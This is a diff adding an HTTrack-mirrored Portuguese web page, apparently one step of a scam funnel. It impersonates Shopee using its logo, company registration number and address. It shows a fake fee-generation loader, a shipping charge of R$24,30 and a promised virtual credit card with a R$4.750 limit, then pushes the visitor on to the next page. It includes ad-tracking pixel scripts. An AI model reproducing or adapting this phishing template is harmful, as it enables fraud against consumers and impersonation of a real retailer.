@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="pt-BR">
+<!-- Mirrored from ativo-agora.site/13-1/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:39:02 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf8" /><!-- /Added by HTTrack -->
+<head>
+    <script
+  src="../../cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.googlePixelId = "68b9055ec30563aafd7449e9";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../../cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="13-1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&amp;display=swap" rel="stylesheet">
+    <title>Detalhes do Envio</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #ee5136;
+        }
+        .logo {
+            width: 125px;
+            padding: 10px;
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 40px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ee5136;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success-message {
+            background-color: #e8f5e9;
+            border: 1px solid #4caf50;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            color: #2e7d32;
+        }
+        .success-message i {
+            margin-right: 10px;
+        }
+        .details-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .details-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .details-text {
+            color: #666;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        .button {
+            background: #ee5136;
+            color: #ffffff;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .button:hover {
+            background: #072c83;
+        }
+    </style>
+</head>
+<body>
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W2NK2Z4N"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <div class="header">
+        <img src="https://freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="content">
+        <div id="loader" class="loader-container" style="border: 1px solid #ddd; border-radius: 8px;">
+            <div class="loader"></div>
+            <p>Gerando a taxa de entrega...</p>
+        </div>
+
+        <div id="shipping-details" style="display: none;">
+            <div class="success-message">
+                <i class="fas fa-check-circle"></i>
+                Taxa de envio gerada com sucesso!
+            </div>
+
+            <div class="details-card">
+                <div class="details-title">Detalhes do Envio</div>
+                <div class="details-text" style="font-weight: bold;">Endereço de entrega:</div>
+                <div class="details-text" id="endereco-entrega"></div>
+                <div class="details-text" id="bairro-cidade"></div>
+                <div class="details-text" id="cep"></div>
+                <script>
+                    const enderecoSalvo = JSON.parse(localStorage.getItem('enderecoEntrega'));
+                    if (enderecoSalvo) {
+                        document.getElementById('endereco-entrega').textContent = `${enderecoSalvo.logradouro}, ${enderecoSalvo.numero} ${enderecoSalvo.complemento ? '- ' + enderecoSalvo.complemento : ''}`;
+                        document.getElementById('bairro-cidade').textContent = `${enderecoSalvo.bairro} - ${enderecoSalvo.cidade}/${enderecoSalvo.estado}`;
+                        document.getElementById('cep').textContent = `CEP: ${enderecoSalvo.cep}`;
+                    }
+                </script>
+            </div>
+
+            <div class="details-card">
+                <div class="details-title">Método de Envio</div>
+                <div class="details-text">PAC</div>
+                <div class="details-text">Prazo de entrega: 15-20 dias úteis</div>
+                <div class="details-text">Valor do frete: R$ 24,30</div>
+            </div>
+
+            <a href="#" onclick="window.location.href = buildUrlWithParams('../14-1/index.html'); return false;" class="button">
+                SIM, VOU QUERER!
+            </a>
+
+            <div style="margin-top: 20px;background-color: #e8f5e9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                    <i class="fas fa-credit-card" style="font-size: 20px; color: #1b5e20;"></i>
+                    <div style="font-size: 16px; font-weight: 600; color: #1b5e20;">Cartão Virtual Disponível Hoje</div>
+                </div>
+                <div style="color: #2e7d32; font-size: 16px; line-height: 1.4;">
+                    Você receberá hoje seu cartão virtual com limite de R$ 4.750 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+                </div>
+            </div>
+            
+
+            <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+                <div style="max-width: 600px; margin: 0 auto;">
+                    <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                        Shopee S/A | 35.635.824/0001-12
+                    </p>
+                    <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                        Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+                    </p>
+                    <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                        © 2025 - Todos os direitos reservados
+                    </p>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('shipping-details').style.display = 'block';
+
+                const endereco = JSON.parse(localStorage.getItem('enderecoEntrega'));
+                if (endereco) {
+                    document.getElementById('endereco-entrega').textContent = 
+                        `${endereco.logradouro}, ${endereco.numero}` + 
+                        (endereco.complemento ? ` - ${endereco.complemento}` : '');
+                    document.getElementById('bairro-cidade').textContent = 
+                        `${endereco.bairro} - ${endereco.cidade}/${endereco.estado}`;
+                    document.getElementById('cep').textContent = 
+                        `CEP: ${endereco.cep}`;
+                }
+            }, 2000);
+        }
+    </script>
+
+
+</body>
+<!-- Mirrored from ativo-agora.site/13-1/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:39:03 GMT -->
+</html>
